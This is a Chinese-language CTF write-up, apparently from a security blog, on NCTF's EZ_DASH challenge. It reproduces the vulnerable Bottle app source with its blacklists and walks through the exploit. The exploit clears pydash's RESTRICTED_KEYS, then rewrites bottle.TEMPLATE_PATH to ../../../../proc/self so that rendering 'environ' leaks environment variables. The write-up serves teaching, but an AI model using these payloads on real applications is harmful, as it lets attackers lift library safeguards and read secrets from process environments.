#  Bottle 框架漏洞攻防实录：从原型链污染到 Flag 获取的完整渗透路径   
原创 零漏安全  零漏安全   2025-04-20 19:05  
  
当 Web 应用暗藏原型链污染漏洞，当环境变量成为关键突破口，安全研究员如何抽丝剥茧、突破层层防护？  
  
（题目来源于NCTF的EZ_DASH）  
### 源码  
```
'''
Hints: Flag在环境变量中
'''


from typing import Optional


import pydash
import bottle
//由此可得这是⽤ Python 的 bottle 框架构建的⼀个 Web 应⽤


__forbidden_path__=['__annotations__', '__call__', '__class__', '__closure__',
               '__code__', '__defaults__', '__delattr__', '__dict__',
               '__dir__', '__doc__', '__eq__', '__format__',
               '__ge__', '__get__', '__getattribute__',
               '__gt__', '__hash__', '__init__', '__init_subclass__',
               '__kwdefaults__', '__le__', '__lt__', '__module__',
               '__name__', '__ne__', '__new__', '__qualname__',
               '__reduce__', '__reduce_ex__', '__repr__', '__setattr__',
               '__sizeof__', '__str__', '__subclasshook__', '__wrapped__',
               "Optional","func","render",
               ]
__forbidden_name__=[
    "bottle"
]
__forbidden_name__.extend(dir(globals()["__builtins__"]))
//__forbidden__函数，黑名单

def setval(name:str, path:str, value:str)-> Optional[bool]:
    if name.find("__")>=0: return False
    for word in __forbidden_name__:
        if name==word:
            return False
    for word in __forbidden_path__:
        if path.find(word)>=0: return False
    obj=globals()[name]
    try:
        pydash.set_(obj,path,value)
    except:
        return False
    return True

@bottle.post('/setValue')
def set_value():
    name = bottle.request.query.get('name')
    path=bottle.request.json.get('path')
    if not isinstance(path,str):
        return "no"
    if len(name)>6 or len(path)>32:
        return "no"
    value=bottle.request.json.get('value')
    return "yes" if setval(name, path, value) else "no"

@bottle.get('/render')
def render_template():
    path=bottle.request.query.get('path')
    if path.find("{")>=0 or path.find("}")>=0 or path.find(".")>=0:
        return "Hacker"
    return bottle.template(path)
bottle.run(host='0.0.0.0', port=8000)
```  
###   
### 一、Bottle 框架的双接口  
```
# 核心路由与污染函数  
@bottle.post('/setValue')  
def set_value():  
    name = bottle.request.query.get('name')  
    path = bottle.request.json.get('path')  
    if len(name) > 6 or len(path) > 32: return "no"  
    value = bottle.request.json.get('value')  
    return "yes" if setval(name, path, value) else "no"  
@bottle.get('/render')  
def render_template():  
    path = bottle.request.query.get('path')  
    if "{".encode() in path.encode() or ".".encode() in path.encode():  
        return "Hacker"  
    return bottle.template(path)  
```  
- **/setValue 接口**  
用于处理POST请求、接收名称、路径和值，调用了setval函数，在此路由中，获取了名称name、  
路径  
path，检查  
path  
是否为字符串类型，检查name的长度是否超过6，path长度是否  
超过32，从请求的JSON数据中获取值value  
  
  
- **/render 接口**  
用于处理GET请求，接收模板⽂件路径，并对其进⾏渲染，在此路由中，从请求查询的参数中获取模板⽂件路径path，并检查路径中是否包含 { 、 } 或 . ，最后调⽤bottle.template函数对模板⽂件进⾏渲染并返回结果  
  
## setval(name,path,value)  
##   
  
name----要污染的对象  
  
path----被污染对象的功能点路径  
  
value---想让他成为的值  
```
 name=pydash 
 path:helpers.RESTRICTED_KEYS 
 value:[]
```  
  
解析：寻找pydash库中helpers.RESTRICTED_KEYS的地址，然后设置为空  
```
 name=setval 
 path:_globals_.bottle.TEMPLATE_PATH 
 value:[../../../../proc/self/]
```  
  
解析：寻找setval函数，将该函数往上查询  
****  
globals  
****  
.（__  
globals__  
 会返回一个包含该函数全局命名  
空间  
的字典，  
可通过setval  
函数的作用域链向上访问  
）  
  
再调用bottle框架中的TEMPLATE_PATH（指定模板文件所在的路径），将路径设置为/proc/self/这样访问path时会自动跳  
转  
到这个路径下，当path=environ时，直接渲染环境变量文件  
### 二、原型链污染  
###   
### 1. 绕过 pydash 的安全限制pydash 库的helpers.py中定义了禁止修改的关键属性：  
```
RESTRICTED_KEYS = ("__globals__", "__builtins__")  
```  
### RESTRICTED_KEYS 通常是一个集合（像列表、元组或者集合对象），其作用是存储受限的键名。这些键名往往是出于安全、性能或者避免冲突等原因，在程序里不允许被使用或者访问的。  
###   
### 这里有两个元素，分别是__globals __和__builtins__，到此思路有了，先污染key函数，使它允许我们使用globals，借此污染bottle.TEMPLATE_PATH，使它路径指向../../../../proc/self/，最后在 /render 路由下 GET 传参 path 为 environ ，对其进行渲染，就可以获取环境变量了  
```
name=pydash   # 污染对象是 pydash
path="helpers.RESTRICTED_KEYS" # 路径就是 helpers ⽂件中的 RESTRICTED_KEYS
value=[]        # 清空受限键列表，修改成为的值就是空列表
```  
  
解除对__globals__  
和__builtins__  
的修改限制  
#### 2. 篡改模板路径指向环境变量  
####   
  
通过污染bottle.TEMPLATE_PATH  
，将模板路径指向存储环境变量的系统文件  
```
name=setval # 污染对象是 setval
path:"__globals__.bottle.TEMPLATE_PATH" # 路径是模板⽂件路径
value:[../../../../proc/self] # 修改为的值是存储环境变量⽂件路径，因为题⽬提
示flag在环境变量中
```  
  
###   
### 三、实战  
###   
  
使用bp在/setValue下抓包，先  
解除 pydash 限制，  
再污染模板路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9GGhFCliayOSFicL3wYP0RjGljQib7TSrWoX80JaesQG14K8h9xia6JryH4iaS3mt1XZnsZTibV1XsXKZ2HdssAm4ExQ/640?wx_fmt=png&from=appmsg "")  
  
触发  
漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9GGhFCliayOSFicL3wYP0RjGljQib7TSrWoqAS6BABkIVGmokw3FHSJGHIUkeZDhZOfibVYiaqGpibsR7bPa1z1ItmfA/640?wx_fmt=png&from=appmsg "")  
  
结语  
  
通过两步污染操作突破框架限制，最终利用模板引擎读取环境变量。该案例揭示了原型链污染在框架级漏洞中的典型利用方式，开发中需严格控制对象属性的修改权限。  
  
  
特别说明：  
此篇文章参考了Pai师傅的相关资料，在此对 Pai 师傅的贡献表示诚挚感谢。文章内容在参考基础上进行了整合与拓展，旨在分享 Bottle 框架原型链污染漏洞相关知识。  
  
